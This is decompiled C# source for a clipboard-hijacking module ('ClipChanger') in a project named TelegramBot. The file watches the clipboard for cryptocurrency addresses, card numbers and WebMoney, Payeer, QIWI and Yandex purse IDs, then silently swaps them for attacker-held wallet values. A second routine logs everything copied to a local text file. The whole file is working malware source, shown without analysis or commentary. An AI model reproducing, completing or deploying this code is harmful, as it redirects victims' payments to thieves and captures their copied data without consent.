using System;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace TelegramBot
{
	// Token: 0x0200000D RID: 13
	internal class ClipChanger
	{
		// Token: 0x06000033 RID: 51 RVA: 0x00002255 File Offset: 0x00000455
		public static void StopChanger()
		{
			ClipboardMonitor.OnClipboardChange -= ClipChanger.GetClip;
			if (ClipChanger.Active)
			{
				ClipboardMonitor.Stop();
			}
		}

		// Token: 0x06000034 RID: 52 RVA: 0x00002274 File Offset: 0x00000474
		public static void StartChanger()
		{
			ClipboardMonitor.OnClipboardChange += ClipChanger.GetClip;
			if (!ClipChanger.Active)
			{
				ClipboardMonitor.Start();
				ClipChanger.Active = true;
			}
		}

		// Token: 0x06000035 RID: 53 RVA: 0x00002299 File Offset: 0x00000499
		public static void StopLogger()
		{
			ClipboardMonitor.OnClipboardChange -= ClipChanger.Check;
			if (ClipChanger.Active)
			{
				ClipboardMonitor.Stop();
			}
		}

		// Token: 0x06000036 RID: 54 RVA: 0x000022B8 File Offset: 0x000004B8
		public static void StartLogger()
		{
			ClipboardMonitor.OnClipboardChange += ClipChanger.Check;
			if (!ClipChanger.Active)
			{
				ClipboardMonitor.Start();
				ClipChanger.Active = true;
			}
		}

		// Token: 0x06000037 RID: 55 RVA: 0x00003B10 File Offset: 0x00001D10
		public static void GetClip(Enums.ClipboardFormat clipboardFormat, object data)
		{
			string text = ClipboardEx.GetText();
			if (string.IsNullOrEmpty(text))
			{
				return;
			}
			foreach (string text2 in text.Split(new char[]
			{
				' ',
				'_',
				'|',
				'(',
				')',
				'\n',
				'.',
				',',
				'-'
			}))
			{
				string.IsNullOrEmpty(text2);
				if (!string.IsNullOrEmpty(Purse.yd))
				{
					if (text2.StartsWith("41001") && text2.Length == 15 && ClipChanger.checkyd(text2))
					{
						ClipboardEx.SetText(text.Replace(text2, Purse.yd));
					}
				}
				else if (!string.IsNullOrEmpty(Purse.btc))
				{
					if (ClipChanger.checkbtc(text2))
					{
						ClipboardEx.SetText(text.Replace(text2, Purse.btc));
					}
				}
				else if (!string.IsNullOrEmpty(Purse.btcg))
				{
					if (ClipChanger.checkbtcg(text2) && text2.StartsWith("G"))
					{
						ClipboardEx.SetText(text.Replace(text2, Purse.btcg));
					}
				}
				else if (!string.IsNullOrEmpty(Purse.ripple))
				{
					if (ClipChanger.checkripple(text2) && text2.StartsWith("r"))
					{
						ClipboardEx.SetText(text.Replace(text2, Purse.ripple));
					}
				}
				else if (!string.IsNullOrEmpty(Purse.cc))
				{
					if ((ClipChanger.checkcc(text2) && text2.Length == 16) || text2.Length == 17)
					{
						ClipboardEx.SetText(text.Replace(text2, Purse.cc));
					}
				}
				else if (!string.IsNullOrEmpty(Purse.dogechain))
				{
					if (text2.StartsWith("D") && ClipChanger.checkdogechain(text2))
					{
						ClipboardEx.SetText(text.Replace(text2, Purse.dogechain));
					}
				}
				else if (!string.IsNullOrEmpty(Purse.tron))
				{
					if (text2.StartsWith("T") && ClipChanger.checktron(text2))
					{
						ClipboardEx.SetText(text.Replace(text2, Purse.tron));
					}
				}
				else if (!string.IsNullOrEmpty(Purse.wmr))
				{
					if ((ClipChanger.checkwmr(text2) && text2.StartsWith("R") && text2.Length == 13) || text2.Length == 12)
					{
						ClipboardEx.SetText(text.Replace(text2, Purse.wmr));
					}
				}
				else if (!string.IsNullOrEmpty(Purse.wmz))
				{
					if ((ClipChanger.checkwmz(text2) && text2.StartsWith("Z") && text2.Length == 13) || text2.Length == 12)
					{
						ClipboardEx.SetText(text.Replace(text2, Purse.wmz));
					}
				}
				else if (!string.IsNullOrEmpty(Purse.wme))
				{
					if ((ClipChanger.checkwme(text2) && text2.StartsWith("E") && text2.Length == 13) || text2.Length == 12)
					{
						ClipboardEx.SetText(text.Replace(text2, Purse.wme));
					}
				}
				else if (!string.IsNullOrEmpty(Purse.wmx))
				{
					if ((ClipChanger.checkwmx(text2) && text2.StartsWith("X") && text2.Length == 13) || text2.Length == 12)
					{
						ClipboardEx.SetText(text.Replace(text2, Purse.wmx));
					}
				}
				else if (!string.IsNullOrEmpty(Purse.payeer))
				{
					if ((ClipChanger.checkpayeer(text2) && text.StartsWith("P")) || text.StartsWith("p"))
					{
						ClipboardEx.SetText(text.Replace(text2, Purse.payeer));
					}
				}
				else if (!string.IsNullOrEmpty(Purse.qiwi) && ((ClipChanger.checkqiwi(text2) && text.Contains("+38")) || text.Contains("+7") || text.Contains("+8")))
				{
					ClipboardEx.SetText(text.Replace(text2, Purse.qiwi));
				}
			}
		}

		// Token: 0x06000038 RID: 56 RVA: 0x00003ED8 File Offset: 0x000020D8
		public static void Check(Enums.ClipboardFormat clipboardFormat, object data)
		{
			string text = ClipboardEx.GetText();
			if (text != ClipChanger.Oldbuffer && !string.IsNullOrEmpty(text))
			{
				ClipChanger.Oldbuffer = text;
				File.AppendAllText(Path.Combine(new string[]
				{
					Application.ExecutablePath.Replace(Path.GetFileName(Application.ExecutablePath), "") + "Log_ClipBoard.txt"
				}), string.Concat(new string[]
				{
					"[",
					DateTime.Now.ToString("MM.dd.yyyy - HH:mm:ss"),
					"] - ",
					text,
					"\r\n\r\n"
				}));
			}
		}

		// Token: 0x06000039 RID: 57 RVA: 0x00003F7C File Offset: 0x0000217C
		private static bool checkwmr(string text)
		{
			if (new Regex("^R[0-9]?[\\d\\- ]{12,13}$").IsMatch(text))
			{
				string code = ClipChanger.GetCode("https://passport.webmoney.ru/asp/CertView.asp?purse=" + text);
				if (!code.Contains("Попробуйте еще раз") && code != "Checksum does not validate")
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x0600003A RID: 58 RVA: 0x00003FCC File Offset: 0x000021CC
		private static bool checkwmz(string text)
		{
			if (new Regex("^Z[0-9]?[\\d\\- ]{12,13}$").IsMatch(text))
			{
				string code = ClipChanger.GetCode("https://passport.webmoney.ru/asp/CertView.asp?purse=" + text);
				if (!code.Contains("Попробуйте еще раз") && code != "Checksum does not validate")
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x0600003B RID: 59 RVA: 0x0000401C File Offset: 0x0000221C
		private static bool checkwme(string text)
		{
			if (new Regex("^E[0-9]?[\\d\\- ]{12,13}$").IsMatch(text))
			{
				string code = ClipChanger.GetCode("https://passport.webmoney.ru/asp/CertView.asp?purse=" + text);
				if (!code.Contains("Попробуйте еще раз") && code != "Checksum does not validate")
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x0600003C RID: 60 RVA: 0x0000406C File Offset: 0x0000226C
		private static bool checkwmx(string text)
		{
			if (new Regex("^X[0-9]?[\\d\\- ]{12,13}$").IsMatch(text))
			{
				string code = ClipChanger.GetCode("https://passport.webmoney.ru/asp/VerifyWMID.asp?wmid=" + text);
				if (!code.Contains("Попробуйте еще раз") && code != "Checksum does not validate")
				{
					return true;
				}
			}
			return false;
		}

		// Token: 0x0600003D RID: 61 RVA: 0x000022DD File Offset: 0x000004DD
		private static bool checkbtcg(string text)
		{
			return new Regex("(^G[A-Za-z0-9]{32,35}?[\\d\\- ])|(^G[A-Za-z0-9]{32,35})$").IsMatch(text) && ClipChanger.GetCode("https://blockchain.info/ru/q/addresstohash/" + text) != "Checksum does not validate";
		}

		// Token: 0x0600003E RID: 62 RVA: 0x00002310 File Offset: 0x00000510
		private static bool checkdogechain(string text)
		{
			return new Regex("(^D[A-Za-z0-9]{32,35}?[\\d\\- ])|(^D[A-Za-z0-9]{32,35})$").IsMatch(text);
		}

		// Token: 0x0600003F RID: 63 RVA: 0x00002327 File Offset: 0x00000527
		private static bool checktron(string text)
		{
			return new Regex("(^(T[A-Z])[A-Za-z0-9]{32,35}?[\\d\\- ])|(^(T[A-Z])[A-Za-z0-9]{32,35})$").IsMatch(text);
		}

		// Token: 0x06000040 RID: 64 RVA: 0x0000233E File Offset: 0x0000053E
		private static bool checkripple(string text)
		{
			return new Regex("(^r[A-Za-z0-9]{32,34}?[\\d\\- ])|(^r[A-Za-z0-9]{32,34})$").IsMatch(text);
		}

		// Token: 0x06000041 RID: 65 RVA: 0x00002355 File Offset: 0x00000555
		private static bool checkcc(string text)
		{
			return new Regex("^([45]{1}[\\d]{15}|[6]{1}[\\d]{17})$").IsMatch(text);
		}

		// Token: 0x06000042 RID: 66 RVA: 0x0000236C File Offset: 0x0000056C
		private static bool checkpayeer(string text)
		{
			return new Regex("^[Pp]{1}[0-9]{7,15}|.+@.+\\..+$").IsMatch(text);
		}

		// Token: 0x06000043 RID: 67 RVA: 0x00002383 File Offset: 0x00000583
		private static bool checkbtc(string text)
		{
			return new Regex("^(?=.*[0-9])(?=.*[a-zA-Z])[\\da-zA-Z]{27,34}$").IsMatch(text) && ClipChanger.GetCode("https://blockchain.info/ru/q/addresstohash/" + text) != "Checksum does not validate";
		}

		// Token: 0x06000044 RID: 68 RVA: 0x000023B6 File Offset: 0x000005B6
		private static bool checkqiwi(string text)
		{
			return new Regex("((\\+38|8)[ ]?)?([(]?\\d{3}[)]?[\\- ]?)?[\\d\\-]{6,14}").IsMatch(text);
		}

		// Token: 0x06000045 RID: 69 RVA: 0x000023CD File Offset: 0x000005CD
		private static bool checkyd(string text)
		{
			return new Regex("^(41001)\\d{10}$").IsMatch(text) && ClipChanger.GetCode("https://money.yandex.ru/to/" + text).Contains("Перевести");
		}

		// Token: 0x06000046 RID: 70 RVA: 0x000040BC File Offset: 0x000022BC
		public static string GetCode(string urlAddress)
		{
			string result;
			try
			{
				ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
				HttpWebResponse httpWebResponse = (HttpWebResponse)((HttpWebRequest)WebRequest.Create(urlAddress)).GetResponse();
				if (httpWebResponse.StatusCode == HttpStatusCode.OK)
				{
					Stream responseStream = httpWebResponse.GetResponseStream();
					StreamReader streamReader;
					if (httpWebResponse.CharacterSet == null)
					{
						streamReader = new StreamReader(responseStream);
					}
					else
					{
						streamReader = new StreamReader(responseStream, Encoding.GetEncoding(httpWebResponse.CharacterSet));
					}
					ClipChanger.data = streamReader.ReadToEnd();
					httpWebResponse.Close();
					streamReader.Close();
				}
				result = ClipChanger.data;
			}
			catch
			{
				result = (ClipChanger.data = "Checksum does not validate");
			}
			return result;
		}

		// Token: 0x04000012 RID: 18
		public static bool Active = false;

		// Token: 0x04000013 RID: 19
		public static string data = "";

		// Token: 0x04000014 RID: 20
		public static string Oldbuffer = ClipboardEx.GetText();
	}
}
